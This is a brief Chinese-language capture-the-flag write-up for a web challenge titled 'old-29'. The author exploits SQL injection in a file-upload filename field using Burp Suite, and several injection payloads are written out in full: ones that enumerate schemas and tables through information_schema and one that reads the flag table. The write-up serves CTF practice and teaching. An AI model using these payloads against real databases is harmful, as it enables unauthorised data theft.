# old-29_400

* 這一題一進去有一個 upload file 的東東，於是隨便上傳了一個 php 的 file，內含 phpinfo()，但是沒什麼特別的事情發生，唯一有的就只有 time ip file 在相對應的位置而已
* 鑑於這一題考的是 sql injection，我們可控並且可能發生的地點應該就在 filename 的地方了。為了方便，用 burp suite 吧
* 說真的，這一題我是了很久，一直在猜到底哪裡是注入點
* 後來我得到了一些結論，首先，sql 語句中相對應的位置應該是 file, time, ip，file 沒什麼限制，time 限制只能是數字，ip 限定只能是自己的 ip，所以注入點就在 file 這件事應該是一目瞭然的，但是前面的語句要先截斷，只能在後面再增設一組了
* 知道了怎麼 inject 了，第一步要先知道資料庫的名稱，這是我的 payload `23',123,'your_ip_address'),((select schema_name from information_schema.schemata limit 1,1),123,'your_ip_address') -- ` 在 burp 中把 filename 改成這樣，就可以看到資料庫名了 `chall29`
* 接下來要知道的是表名，這是我的 payload 
    `23',123,'your_ip_address'),((select table_name from information_schema.tables where table_schema='chall29' limit 0,1),123,'your_ip_address') -- `
    可以發現爆出的表名是 `files`
    接下來稍微改一下
    `23',123,'your_ip_address'),((select table_name from information_schema.tables where table_schema='chall29' limit 1,1),123,'your_ip_address') -- `
    可以發現爆出了一個有趣的表名 `flag_congratz`
* 接下來就簡單拉，直接來
    `23',123,'your_ip_address'),((select * from flag_congratz limit 0,1)),123,'your_ip_address') -- `
    就可以成功的拿到 flag 拉
* flag : FLAG{didYouFeelConfused?_sorry:)}
